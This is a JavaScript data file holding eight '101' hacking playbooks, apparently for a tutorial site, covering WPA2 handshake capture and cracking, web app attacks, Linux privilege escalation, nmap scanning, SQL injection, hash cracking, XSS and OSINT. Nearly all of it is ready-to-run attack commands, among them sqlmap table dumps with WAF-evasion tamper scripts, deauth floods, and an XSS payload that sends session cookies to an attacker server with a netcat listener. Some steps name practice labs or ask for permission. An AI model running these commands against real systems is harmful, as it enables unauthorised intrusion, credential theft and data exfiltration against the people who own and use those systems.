export const PLAYBOOK_CONTENT = {
  'wifi-hacking-101': {
    setup: {
      title: 'What You Need',
      items: [
        'Kali Linux or Parrot OS (VM or bare metal)',
        'A wireless adapter that supports monitor mode (e.g. Alfa AWUS036ACH)',
        'aircrack-ng suite — pre-installed on Kali',
        'A wordlist — /usr/share/wordlists/rockyou.txt',
        'Permission to test the target network',
      ],
    },
    steps: [
      {
        title: 'Check your wireless interfaces',
        desc: 'List available network interfaces and confirm your wireless adapter is detected.',
        commands: ['iwconfig', 'ip link show'],
      },
      {
        title: 'Enable monitor mode',
        desc: 'Put your wireless card into monitor mode so it can capture all nearby traffic.',
        commands: [
          'sudo airmon-ng check kill',
          'sudo airmon-ng start wlan0',
          'iwconfig wlan0mon',
        ],
      },
      {
        title: 'Scan for nearby networks',
        desc: 'Use airodump-ng to discover nearby access points and their BSSIDs, channels, and encryption.',
        commands: ['sudo airodump-ng wlan0mon'],
      },
      {
        title: 'Target a specific network',
        desc: 'Lock onto your target AP and capture traffic. Replace BSSID and channel with your target values.',
        commands: [
          'sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon',
        ],
      },
      {
        title: 'Force a handshake with deauth',
        desc: 'Send deauthentication frames to kick a client off the AP — they will reconnect and you capture the WPA2 handshake.',
        commands: [
          'sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon',
        ],
      },
      {
        title: 'Crack the handshake',
        desc: 'Use aircrack-ng with a wordlist to crack the captured WPA2 handshake.',
        commands: [
          'sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap',
        ],
      },
      {
        title: 'Restore managed mode',
        desc: 'When done, stop monitor mode and restore normal networking.',
        commands: [
          'sudo airmon-ng stop wlan0mon',
          'sudo systemctl restart NetworkManager',
        ],
      },
    ],
  },

  'web-app-hacking-101': {
    setup: {
      title: 'What You Need',
      items: [
        'Kali Linux or Parrot OS',
        'Burp Suite Community Edition',
        'gobuster or ffuf for directory busting',
        'A target — use DVWA, HackTheBox, or TryHackMe',
        'Firefox with FoxyProxy configured to Burp (127.0.0.1:8080)',
      ],
    },
    steps: [
      {
        title: 'Passive recon — gather info',
        desc: 'Before touching the app, gather information passively.',
        commands: [
          'whois target.com',
          'dig target.com ANY',
          'curl -I https://target.com',
        ],
      },
      {
        title: 'Directory and file enumeration',
        desc: 'Discover hidden paths, admin panels, and backup files.',
        commands: [
          'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt',
          'ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt',
        ],
      },
      {
        title: 'Intercept requests with Burp Suite',
        desc: 'Set your browser proxy to 127.0.0.1:8080, open Burp, and browse the app. All requests appear in the Proxy > Intercept tab.',
        commands: ['burpsuite &'],
      },
      {
        title: 'Test for XSS',
        desc: 'Inject a basic XSS payload into input fields and URL parameters.',
        commands: [
          "curl 'http://target.com/search?q=<script>alert(1)</script>'",
          "curl 'http://target.com/search?q=\"><img src=x onerror=alert(1)>'",
        ],
      },
      {
        title: 'Test for SQL injection',
        desc: 'Try basic SQLi payloads in login forms and URL parameters.',
        commands: [
          "curl 'http://target.com/login' --data \"username=admin'--&password=x\"",
          "sqlmap -u 'http://target.com/page?id=1' --dbs",
        ],
      },
      {
        title: 'Scan with Nikto',
        desc: 'Run a quick automated scan to find common misconfigurations.',
        commands: ['nikto -h http://target.com'],
      },
    ],
  },

  'linux-privilege-escalation-101': {
    setup: {
      title: 'What You Need',
      items: [
        'A low-privilege shell on a Linux target',
        'LinPEAS or LinEnum for automated enumeration',
        'Basic understanding of Linux file permissions',
        'A target — use TryHackMe or HackTheBox machines',
      ],
    },
    steps: [
      {
        title: 'Basic system enumeration',
        desc: 'Gather OS info, current user, and running processes.',
        commands: [
          'id && whoami',
          'uname -a',
          'cat /etc/os-release',
          'ps aux',
          'env',
        ],
      },
      {
        title: 'Find SUID binaries',
        desc: 'SUID binaries run as their owner (often root). Find exploitable ones.',
        commands: [
          'find / -perm -4000 -type f 2>/dev/null',
          'find / -perm -u=s -type f 2>/dev/null',
        ],
      },
      {
        title: 'Check sudo permissions',
        desc: 'See what commands you can run as root without a password.',
        commands: ['sudo -l'],
      },
      {
        title: 'Inspect cron jobs',
        desc: 'Look for cron jobs running as root that you can hijack.',
        commands: [
          'cat /etc/crontab',
          'ls -la /etc/cron*',
          'crontab -l',
        ],
      },
      {
        title: 'Find writable files and paths',
        desc: 'World-writable files or PATH entries can be abused for escalation.',
        commands: [
          'find / -writable -type f 2>/dev/null | grep -v proc',
          'echo $PATH',
        ],
      },
      {
        title: 'Run LinPEAS for full enumeration',
        desc: 'Upload and run LinPEAS for a comprehensive automated check.',
        commands: [
          'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh',
          'chmod +x linpeas.sh',
          './linpeas.sh | tee linpeas_output.txt',
        ],
      },
      {
        title: 'Check for kernel exploits',
        desc: 'If the kernel is old, check for known exploits.',
        commands: [
          'uname -r',
          'searchsploit linux kernel $(uname -r)',
        ],
      },
    ],
  },

  'network-recon-101': {
    setup: {
      title: 'What You Need',
      items: [
        'Kali Linux or any Linux distro',
        'nmap — pre-installed on Kali',
        'netdiscover for ARP scanning',
        'Permission to scan the target network',
      ],
    },
    steps: [
      {
        title: 'Discover live hosts on the network',
        desc: 'Find all active hosts on a subnet using a ping sweep.',
        commands: [
          'nmap -sn 192.168.1.0/24',
          'netdiscover -r 192.168.1.0/24',
        ],
      },
      {
        title: 'Fast port scan',
        desc: 'Quickly scan the most common 1000 ports on a target.',
        commands: ['nmap -T4 -F 192.168.1.1'],
      },
      {
        title: 'Full port scan',
        desc: 'Scan all 65535 ports — slower but thorough.',
        commands: ['nmap -p- -T4 192.168.1.1'],
      },
      {
        title: 'Service and version detection',
        desc: 'Identify what services and versions are running on open ports.',
        commands: ['nmap -sV -sC -p 22,80,443,3306 192.168.1.1'],
      },
      {
        title: 'OS fingerprinting',
        desc: 'Attempt to identify the target operating system.',
        commands: ['sudo nmap -O 192.168.1.1'],
      },
      {
        title: 'Aggressive scan (all-in-one)',
        desc: 'Run OS detection, version detection, script scanning, and traceroute.',
        commands: ['sudo nmap -A 192.168.1.1'],
      },
      {
        title: 'Save results to a file',
        desc: 'Output scan results in all formats for later review.',
        commands: ['nmap -A 192.168.1.1 -oA scan_results'],
      },
    ],
  },

  'sql-injection-101': {
    setup: {
      title: 'What You Need',
      items: [
        'Kali Linux or Parrot OS',
        'sqlmap — pre-installed on Kali',
        'Burp Suite for manual testing',
        'A vulnerable target — DVWA, SQLi-labs, or HackTheBox',
      ],
    },
    steps: [
      {
        title: 'Detect SQLi manually',
        desc: "Add a single quote to a parameter. If the app errors, it may be vulnerable.",
        commands: [
          "curl 'http://target.com/page?id=1'",
          "curl 'http://target.com/page?id=1''",
          "curl 'http://target.com/page?id=1 AND 1=1--'",
          "curl 'http://target.com/page?id=1 AND 1=2--'",
        ],
      },
      {
        title: 'Enumerate databases with sqlmap',
        desc: 'Automate detection and list all databases.',
        commands: [
          "sqlmap -u 'http://target.com/page?id=1' --dbs",
        ],
      },
      {
        title: 'List tables in a database',
        desc: 'Once you have a database name, list its tables.',
        commands: [
          "sqlmap -u 'http://target.com/page?id=1' -D target_db --tables",
        ],
      },
      {
        title: 'Dump table contents',
        desc: 'Extract all data from a specific table.',
        commands: [
          "sqlmap -u 'http://target.com/page?id=1' -D target_db -T users --dump",
        ],
      },
      {
        title: 'Test POST parameters',
        desc: 'Test login forms and POST data for SQLi.',
        commands: [
          "sqlmap -u 'http://target.com/login' --data='username=admin&password=test' --dbs",
        ],
      },
      {
        title: 'Bypass WAF with tamper scripts',
        desc: 'Use tamper scripts to evade basic WAF filters.',
        commands: [
          "sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment --dbs",
        ],
      },
    ],
  },

  'password-cracking-101': {
    setup: {
      title: 'What You Need',
      items: [
        'Kali Linux',
        'hashcat — pre-installed on Kali',
        'john (John the Ripper) — pre-installed on Kali',
        'rockyou.txt wordlist — /usr/share/wordlists/rockyou.txt',
        'A GPU helps significantly for hashcat',
      ],
    },
    steps: [
      {
        title: 'Identify the hash type',
        desc: 'Before cracking, identify what type of hash you have.',
        commands: [
          'hash-identifier',
          'hashid 5f4dcc3b5aa765d61d8327deb882cf99',
        ],
      },
      {
        title: 'Crack MD5 with hashcat',
        desc: 'Use hashcat in dictionary attack mode (-a 0) for MD5 (-m 0).',
        commands: [
          'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt',
        ],
      },
      {
        title: 'Crack SHA-256 with hashcat',
        desc: 'SHA-256 uses mode 1400.',
        commands: [
          'hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt',
        ],
      },
      {
        title: 'Crack NTLM (Windows) hashes',
        desc: 'NTLM hashes from Windows SAM or NTDS use mode 1000.',
        commands: [
          'hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt',
        ],
      },
      {
        title: 'Crack with John the Ripper',
        desc: 'John auto-detects hash types and cracks them.',
        commands: [
          'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
          'john --show hash.txt',
        ],
      },
      {
        title: 'Generate a custom wordlist with crunch',
        desc: 'Create targeted wordlists based on known password patterns.',
        commands: [
          'crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt',
        ],
      },
    ],
  },

  'xss-101': {
    setup: {
      title: 'What You Need',
      items: [
        'Burp Suite Community Edition',
        'Firefox with FoxyProxy',
        'A vulnerable target — DVWA, XSS-labs, or PortSwigger Web Academy',
        'Basic understanding of HTML and JavaScript',
      ],
    },
    steps: [
      {
        title: 'Test for reflected XSS',
        desc: 'Inject a basic payload into URL parameters and search fields.',
        commands: [
          "curl 'http://target.com/search?q=<script>alert(1)</script>'",
          "curl 'http://target.com/search?q=<img src=x onerror=alert(1)>'",
        ],
      },
      {
        title: 'Bypass basic filters',
        desc: 'If angle brackets are filtered, try alternative payloads.',
        commands: [
          "curl 'http://target.com/search?q=javascript:alert(1)'",
          "curl 'http://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>'",
          "curl 'http://target.com/search?q=<svg onload=alert(1)>'",
        ],
      },
      {
        title: 'Test for stored XSS',
        desc: 'Submit a payload in a comment, profile field, or message that gets saved and rendered.',
        commands: [
          "curl -X POST 'http://target.com/comment' --data 'body=<script>alert(document.cookie)</script>'",
        ],
      },
      {
        title: 'Steal cookies with XSS',
        desc: 'Exfiltrate session cookies to your server.',
        commands: [
          "<script>document.location='http://your-server.com/steal?c='+document.cookie</script>",
          "nc -lvnp 8080",
        ],
      },
      {
        title: 'DOM-based XSS',
        desc: 'Test URL fragments and hash values that are written to the DOM.',
        commands: [
          "http://target.com/page#<img src=x onerror=alert(1)>",
        ],
      },
    ],
  },

  'osint-101': {
    setup: {
      title: 'What You Need',
      items: [
        'Kali Linux or any OS',
        'theHarvester — pre-installed on Kali',
        'Shodan account (free tier works)',
        'Maltego Community Edition (optional)',
        'A browser with no personal accounts logged in',
      ],
    },
    steps: [
      {
        title: 'Domain and DNS enumeration',
        desc: 'Gather DNS records, subdomains, and WHOIS data.',
        commands: [
          'whois target.com',
          'dig target.com ANY',
          'dig target.com MX',
          'host -t ns target.com',
        ],
      },
      {
        title: 'Subdomain enumeration',
        desc: 'Find subdomains using passive and active techniques.',
        commands: [
          'subfinder -d target.com',
          'amass enum -passive -d target.com',
          'assetfinder --subs-only target.com',
        ],
      },
      {
        title: 'Email harvesting',
        desc: 'Collect email addresses associated with the target domain.',
        commands: [
          'theHarvester -d target.com -b google,bing,linkedin -l 200',
        ],
      },
      {
        title: 'Shodan search',
        desc: 'Find internet-exposed services and devices linked to the target.',
        commands: [
          'shodan search "org:target.com"',
          'shodan host 1.2.3.4',
        ],
      },
      {
        title: 'Google dorking',
        desc: 'Use Google search operators to find sensitive exposed files.',
        commands: [
          'site:target.com filetype:pdf',
          'site:target.com inurl:admin',
          'site:target.com intitle:"index of"',
          '"@target.com" site:linkedin.com',
        ],
      },
      {
        title: 'Check breach data',
        desc: 'See if target emails appear in known data breaches.',
        commands: [
          'curl https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com',
        ],
      },
    ],
  },
}
